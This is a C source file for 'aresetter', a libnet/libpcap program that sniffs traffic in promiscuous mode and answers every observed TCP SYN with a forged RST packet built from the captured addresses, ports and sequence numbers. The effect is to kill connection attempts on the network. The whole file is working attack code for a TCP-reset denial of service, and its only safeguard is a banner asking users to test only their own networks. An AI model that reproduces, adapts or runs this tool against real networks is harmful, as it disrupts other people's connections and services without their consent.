/* Include some header files */
#include <stdio.h>
#include <string.h>
#include <libnet.h>
#include <pcap.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#define ETHHDR_SIZE 14

/* Version */
char *version="0.02";

char pc_err[PCAP_ERRBUF_SIZE], *re_err;
char *dev=NULL;
int snaplen = 65535, promisc = 1, to = 1000;
int link_offset;
pcap_t *pd;

/* The different TCP flags */
int ar_ack, ar_syn, ar_rst, ar_fin, ar_urg, ar_psh;


/* Kill the connection */
int kill_connection (char *source_ip, char *dest_ip, u_short src_prt, u_short dst_prt, u_long ack_seq)
{
	u_long s_ip, d_ip;
        u_char *packet;
        int packet_size, network, c;
	
	if (!(s_ip = libnet_name_resolve(dest_ip, LIBNET_RESOLVE))) {
	  libnet_error(LIBNET_ERR_FATAL, "Bad destination IP!\n");
	}

	if (!(d_ip = libnet_name_resolve(source_ip, LIBNET_RESOLVE))) {
	  libnet_error(LIBNET_ERR_FATAL, "Bad source IP!\n");
	}

        packet_size = LIBNET_IP_H + LIBNET_TCP_H;
	libnet_init_packet(packet_size, &packet);
	
        if (packet == NULL) {
          libnet_error(LIBNET_ERR_FATAL, "libnet_init_packet failed!\n");
        }
	
        network = libnet_open_raw_sock(IPPROTO_RAW);
	
        if (network == -1) {
          libnet_error(LIBNET_ERR_FATAL, "libnet_open_raw_sock failed!\n");
        }

	/* Build the packet */
	libnet_build_ip(LIBNET_TCP_H,
			IPTOS_LOWDELAY,
			242,
			0,
			48,
			IPPROTO_TCP,
			s_ip,
			d_ip,
			NULL,
			0,
			packet);

	libnet_build_tcp(src_prt,
			dst_prt,
			ack_seq,
			0x53,
			TH_RST,
			1024,
			0,
			NULL,
			0,
			packet + LIBNET_IP_H);

	if (libnet_do_checksum(packet, IPPROTO_TCP, LIBNET_TCP_H) == -1) {
	  libnet_error(LIBNET_ERR_FATAL, "libnet_do_checksum failed\n");
	}

	c = libnet_write_ip(network, packet, packet_size);

	if (c < packet_size) {
	  libnet_error(LIBNET_ERR_FATAL, "libnet_write_ip failed!\n");
	}

	printf("Sending RST (%lu) %s:%d => %s:%d.\n\n", ack_seq, source_ip, src_prt, dest_ip, dst_prt);

	return(0);
}


/* We look for a SYN/ACK and call kill_connection */
void process (u_char *data1, struct pcap_pkthdr* h, u_char *p) {
  struct ip* ip_packet = (struct ip *)(p + link_offset);
  unsigned ip_hl = ip_packet->ip_hl*4;
  //unsigned ip_off = ntohs(ip_packet->ip_off);
  //unsigned fragmented = ip_off & (IP_MF | IP_OFFMASK);
  //unsigned frag_offset = fragmented?(ip_off & IP_OFFMASK) * 8:0;
  char *s_ip, *d_ip;
  
  //char *data;
  //int len;
  switch (ip_packet->ip_p) {
    case IPPROTO_TCP: {
      struct tcphdr* tcp = (struct tcphdr *)(((char *)ip_packet) + ip_hl);

      /*
      #ifdef __FAVOUR_BSD
      unsigned tcphdr_offset = fragmented?0:(tcp->th_off * 4);
      #else
      unsigned tcphdr_offset = fragmented?0:(tcp->doff * 4);
      #endif
      */
      
      // data = ((char*)tcp) + tcphdr_offset;
      // len = ntohs(ip_packet->ip_len) - ip_hl - tcphdr_offset;
      // printf("%i\n", len);
       
      (tcp->th_flags & TH_SYN)?(ar_syn=1):(ar_syn=0);
      (tcp->th_flags & TH_ACK)?(ar_ack=1):(ar_ack=0);
      
      if(ar_syn==1) { //&& ar_ack==1) {
        printf("%s:%d => ",
	  inet_ntoa(ip_packet->ip_dst), ntohs(tcp->th_dport));
	printf("%s:%d (",
	  inet_ntoa(ip_packet->ip_src), ntohs(tcp->th_sport));
	printf("%d:%u:%u).\n",
	  ntohs(ip_packet->ip_id), ntohl(tcp->th_seq), ntohl(tcp->th_ack));

	s_ip=(strdup(inet_ntoa(ip_packet->ip_src)));
	d_ip=(strdup(inet_ntoa(ip_packet->ip_dst)));
	
	kill_connection(s_ip, d_ip, ((u_short) ntohs(tcp->th_dport)), ((u_short) ntohs(tcp->th_sport)), ntohl(tcp->th_ack));
      }
    }
  }
}

/* Show banner */
int banner (char *dev) {
	printf("\naresetter v%s - Programmed by Martin Kluge\n", version);
	printf("============================================\n");
	printf("aresetter comes under the GPL (see file COPYING for more details).\n");
	printf("Please use this software only to test YOUR OWN network(s)!\n\n");
	printf("Looking for connection attempts on dev: %s\n", dev);

	return(0);
}	

/* Main stuff */
int main (void) {
	if (!(dev = pcap_lookupdev(pc_err))) {
	  perror(pc_err);
	  exit(-1);
	}
	
	banner(dev);
	
	if ((pd = pcap_open_live(dev, snaplen, promisc, to, pc_err)) == NULL) {
	  perror(pc_err);
	  exit(-1);
	}
	
	link_offset = ETHHDR_SIZE;
	
	while (pcap_loop(pd, 0, (pcap_handler)process, 0));
	
	return(0);
}

